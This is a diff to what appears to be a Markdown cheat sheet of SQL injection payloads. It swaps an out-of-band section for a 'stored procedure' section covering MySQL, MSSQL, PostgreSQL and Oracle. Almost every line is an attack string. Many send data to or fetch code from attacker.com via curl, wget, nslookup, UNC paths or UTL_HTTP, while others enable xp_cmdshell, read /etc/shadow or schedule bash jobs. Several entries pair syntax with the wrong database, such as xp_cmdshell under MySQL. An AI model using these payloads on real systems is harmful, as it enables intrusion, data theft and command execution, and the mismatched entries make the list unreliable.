@@ -285,54 +285,57 @@ Here are **200+ Boolean-Based Blind SQLi Payloads** categorized by database type
 
 ---
 
-## 📋 Out-of-Band (OOB) SQLi Payloads
+## 📋 Stored Procedure SQLi Payloads
 
 ### MySQL
-- `' UNION SELECT 1,LOAD_FILE('\\\\attacker.com\\payload') --`
-- `' AND LOAD_FILE('\\\\attacker.com\\payload') --`
-- `' AND EXPLOIT('http://attacker.com/payload') --`
-- `' UNION SELECT 1 INTO OUTFILE '\\\\attacker.com\\payload.txt' --`
-- `' INTO OUTFILE '\\\\attacker.com\\payload.txt' --`
-- `' UNION SELECT LOAD_FILE('\\\\attacker.com\\payload.txt') --`
-- `' INTO DUMPFILE '\\\\attacker.com\\dump.txt' --`
-- `' INTO OUTFILE '\\\\attacker.com\\data.txt' --`
-- `' AND UDF_EXEC('http://attacker.com/payload') --`
-- `' UNION SELECT 1,2,3,4 INTO OUTFILE '\\\\attacker.com\\data.txt' --`
+- `' ; CALL inject_data('http://attacker.com/payload') --`
+- `' ; CALL xp_cmdshell('ping attacker.com') --`
+- `' ; CALL UDF_EXEC('curl http://attacker.com/payload') --`
+- `' ; CALL LOAD_FILE('\\\\attacker.com\\payload') --`
+- `' ; CALL xp_fileexist('\\\\attacker.com\\file') --`
+- `' ; CALL LOAD_FILE('\\\\attacker.com\\data.txt') --`
+- `' ; CALL UDF_EXEC('http://attacker.com/exploit') --`
+- `' ; CALL xp_dirtree('\\\\attacker.com\\test') --`
+- `' ; CALL xp_cmdshell('curl -X POST http://attacker.com/data') --`
+- `' ; CALL UDF_EXEC('ping attacker.com') --`
 
 ### MSSQL
-- `' ; EXEC xp_dirtree '\\\\attacker.com\\payload' --`
-- `' ; EXEC xp_fileexist '\\\\attacker.com\\payload' --`
-- `' ; EXEC xp_cmdshell 'ping attacker.com' --`
-- `' ; EXEC master..xp_dirtree '\\\\attacker.com\\payload' --`
-- `' ; EXEC master..xp_fileexist '\\\\attacker.com\\file' --`
-- `' ; EXEC xp_cmdshell 'curl http://attacker.com/payload' --`
-- `' ; EXEC master..xp_dirtree '\\\\attacker.com\\check' --`
-- `' ; EXEC master..xp_fileexist '\\\\attacker.com\\data.txt' --`
-- `' ; EXEC sp_OACreate 'WScript.Shell','ping attacker.com' --`
+- `' ; EXEC sp_configure 'show advanced options', 1; RECONFIGURE --`
 - `' ; EXEC master..xp_cmdshell 'nslookup attacker.com' --`
+- `' ; EXEC sp_executesql N'select * from users where id=1; EXEC xp_cmdshell(''ping attacker.com'')' --`
+- `' ; EXEC xp_cmdshell 'curl http://attacker.com/payload' --`
+- `' ; EXEC master..xp_fileexist('\\\\attacker.com\\file') --`
+- `' ; EXEC master..xp_dirtree('\\\\attacker.com\\data') --`
+- `' ; EXEC sp_OACreate 'WScript.Shell','ping attacker.com' --`
+- `' ; EXEC xp_cmdshell 'wget http://attacker.com/payload' --`
+- `' ; EXEC sp_executesql N'select * from users; EXEC xp_cmdshell(''curl attacker.com'')' --`
+- `' ; EXEC master..xp_cmdshell 'dir C:\' --`
 
 ### PostgreSQL
-- `' ; COPY (SELECT 'OOB Test') TO PROGRAM 'curl http://attacker.com/payload' --`
-- `' ; COPY (SELECT current_user) TO PROGRAM 'curl http://attacker.com/payload' --`
-- `' ; COPY (SELECT version()) TO PROGRAM 'wget http://attacker.com/payload' --`
-- `' ; COPY (SELECT 'data') TO PROGRAM 'ping attacker.com' --`
-- `' ; COPY (SELECT 'check') TO PROGRAM 'curl http://attacker.com/check' --`
-- `' ; COPY (SELECT 'info') TO PROGRAM 'wget http://attacker.com/info' --`
-- `' ; COPY (SELECT 'test') TO PROGRAM 'nslookup attacker.com' --`
-- `' ; COPY (SELECT 'user') TO PROGRAM 'curl -d "data=OOB Test" http://attacker.com' --`
-- `' ; COPY (SELECT 'output') TO PROGRAM 'curl -X POST -d "alert=OOB Test" http://attacker.com' --`
-- `' ; COPY (SELECT 'results') TO PROGRAM 'wget http://attacker.com/results' --`
+- `' ; SELECT * FROM pg_read_file('/etc/passwd') --`
+- `' ; SELECT * FROM pg_ls_dir('/') --`
+- `' ; COPY (SELECT 'Payload') TO PROGRAM 'curl http://attacker.com/payload' --`
+- `' ; COPY (SELECT version()) TO PROGRAM 'wget http://attacker.com/data' --`
+- `' ; COPY (SELECT 'Test') TO PROGRAM 'ping attacker.com' --`
+- `' ; COPY (SELECT 'Check') TO PROGRAM 'curl http://attacker.com/check' --`
+- `' ; SELECT pg_read_file('/etc/hosts') --`
+- `' ; SELECT pg_ls_dir('/var/www/html') --`
+- `' ; SELECT pg_read_file('/etc/shadow') --`
+- `' ; COPY (SELECT 'OOB Test') TO PROGRAM 'nslookup attacker.com' --`
 
 ### Oracle
-- `' AND UTL_HTTP.REQUEST('http://attacker.com/payload') --`
-- `' UNION SELECT UTL_HTTP.REQUEST('http://attacker.com/data') FROM DUAL --`
-- `' AND HTTPURITYPE('http://attacker.com/payload').GETCLOB() FROM DUAL --`
-- `' UNION SELECT HTTPURITYPE('http://attacker.com/check').GETCLOB() FROM DUAL --`
-- `' AND UTL_INADDR.GET_HOST_ADDRESS('attacker.com') --`
-- `' UNION SELECT UTL_INADDR.GET_HOST_ADDRESS('attacker.com') FROM DUAL --`
-- `' AND HTTPURITYPE('http://attacker.com/info').GETCLOB() FROM DUAL --`
-- `' UNION SELECT UTL_HTTP.REQUEST('http://attacker.com/status') FROM DUAL --`
-- `' AND UTL_INADDR.GET_HOST_ADDRESS('attacker.com') FROM DUAL --`
-- `' AND UTL_HTTP.REQUEST('http://attacker.com/output') --`
+- `' ; EXEC DBMS_SCHEDULER.CREATE_JOB(job_name => 'OOBTest', job_type => 'EXECUTABLE', job_action => '/bin/bash -c "curl http://attacker.com/payload"', enabled => TRUE) --`
+- `' ; EXEC DBMS_LDAP.INIT('attacker.com', 389) --`
+- `' ; EXEC UTL_HTTP.REQUEST('http://attacker.com/payload') --`
+- `' ; EXEC HTTPURITYPE('http://attacker.com/data').GETCLOB() FROM DUAL --`
+- `' ; EXEC UTL_INADDR.GET_HOST_ADDRESS('attacker.com') --`
+- `' ; EXEC DBMS_LDAP.INIT('attacker.com', 8080) --`
+- `' ; EXEC DBMS_SCHEDULER.RUN_JOB('OOBTest') --`
+- `' ; EXEC UTL_HTTP.REQUEST('http://attacker.com/check') --`
+- `' ; EXEC HTTPURITYPE('http://attacker.com/info').GETCLOB() FROM DUAL --`
+- `' ; EXEC UTL_INADDR.GET_HOST_ADDRESS('attacker.com') FROM DUAL --`
+
+---
+
 
 
